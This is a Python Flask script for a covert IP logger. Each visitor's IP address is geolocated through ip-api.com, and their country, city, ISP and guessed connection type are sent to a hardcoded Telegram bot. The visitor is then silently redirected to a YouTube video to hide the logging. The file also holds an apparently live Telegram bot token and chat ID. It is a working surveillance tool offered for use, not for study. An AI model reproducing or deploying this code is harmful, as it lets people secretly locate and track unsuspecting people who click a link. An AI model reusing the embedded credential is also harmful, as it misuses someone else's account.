from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Telegram Bot Details
BOT_TOKEN = '8334218363:AAHUtSFy9BvRPd2VpHxDA-pRSzgNPUay3d4'
CHAT_ID = '5497521471'

# Redirect target
YOUTUBE_LINK = "https://youtube.com/watch?v=dQw4w9WgXcQ"

# Function to analyze IP
def analyze_ip(ip):
    try:
        url = f"http://ip-api.com/json/{ip}"
        res = requests.get(url, timeout=5)
        data = res.json()

        if data['status'] == 'success':
            country = data.get("country", "N/A")
            city = data.get("city", "N/A")
            isp = data.get("isp", "N/A")
            org = data.get("org", "N/A")

            # Detect connection type
            if "mobile" in org.lower() or "lte" in org.lower() or "cellular" in isp.lower():
                conn_type = "📱 بيانات موبايل"
            elif "vpn" in org.lower() or "vpn" in isp.lower():
                conn_type = "🛡️ VPN أو بروكسي"
            elif "broadband" in org.lower() or "dsl" in org.lower() or "wifi" in org.lower():
                conn_type = "📶 WiFi / DSL"
            else:
                conn_type = "🔍 غير معروف / عام"

            # Compose message
            msg = (
                f"📥 IP Logged: {ip}\n"
                f"🌍 Country: {country}\n"
                f"🏙️ City: {city}\n"
                f"🏢 ISP: {isp}\n"
                f"⚙️ Org: {org}\n"
                f"🔍 Connection: {conn_type}"
            )
            return msg
        else:
            return f"IP Logged: {ip} (No Geo Info)"
    except Exception:
        return f"IP Logged: {ip} (Lookup failed)"

@app.route('/')
def index():
    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_ip = raw_ip.split(',')[0].strip()

    # Analyze and prepare message
    msg = analyze_ip(user_ip)

    # Send to Telegram
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": msg
    }
    try:
        requests.post(telegram_url, json=data)
    except Exception as e:
        print("Telegram Error:", e)

    # Redirect to YouTube
    return redirect(YOUTUBE_LINK)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
